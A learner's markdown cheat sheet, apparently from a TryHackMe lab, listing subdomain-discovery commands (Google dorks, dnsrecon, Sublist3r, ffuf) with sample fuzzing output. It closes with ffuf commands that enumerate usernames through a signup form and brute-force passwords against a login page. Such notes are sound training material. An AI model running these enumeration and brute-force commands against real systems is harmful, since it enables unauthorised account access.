# Here are tool lists:

## Subdomine finder tools:
1. Search engine:
    * Tool name: Google
        ```bash
        # Just search in Google with:
        -site:www.domin.com site:*.domin.comweb55.acmeitsupport.thm
        ```
1. Bruteforce DNS:
    * Tool name : `dnsrecon`
        ```bash
        # Example:
        # A fake example cont run on terminal
        dnsrecon -t brt -d acmeitsupport.thm
        ```
1. Sublist3r:
    * Tool name: `Sublist3r`
        ```bash
        # Example:
        # A fake example cont run on terminal
        ./sublist3r.py -d acmeitsupport.thm
        ```
1. ffuf:
    * Tool name: `ffuf`
        [link](https://github.com/ffuf/ffuf)
        ```bash
        # Example: 
        ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.188.87 -fs {size}
        # remember to replace the {size}
        ```
        ```bash
        # What is size
        # Size can be seen as a key to remove most commonly showed useless result!

        # Example
        [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www02                   [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www-int                 [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www0                    [Status: 200, Size: 2395, Words: 503, Lines: 52]
        yellow                  [Status: 200, Size: 56, Words: 8, Lines: 1]
        www-2                   [Status: 200, Size: 2395, Words: 503, Lines: 52]
        xi                      [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www-1                   [Status: 200, Size: 2395, Words: 503, Lines: 52]
        x-ray                   [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www-02                  [Status: 200, Size: 2395, Words: 503, Lines: 52]
        wyoming                 [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www-01                  [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www-                    [Status: 200, Size: 2395, Words: 503, Lines: 52]
        wwwchat                 [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www                     [Status: 200, Size: 2395, Words: 503, Lines: 52]
        wwwmail                 [Status: 200, Size: 2395, Words: 503, Lines: 52]
        wv                      [Status: 200, Size: 2395, Words: 503, Lines: 52]
        wwwdev                  [Status: 200, Size: 2395, Words: 503, Lines: 52]
        www3                    [Status: 200, Size: 2395, Words: 503, Lines: 52]

        # because 2395 shows many times and it make us hard to find other files, 
        # so we decided to filter it out with -fs {2395}


        ```

        ```bash
        #Ffuf check existing username
        ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.42.220/customers/signup -mr "username already exists"
        ```

        ```bash
        # Example uname pass brute force
        # W1 is finded uname, W2 is testing common password list

        ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.42.220/customers/login -fc 200
        ```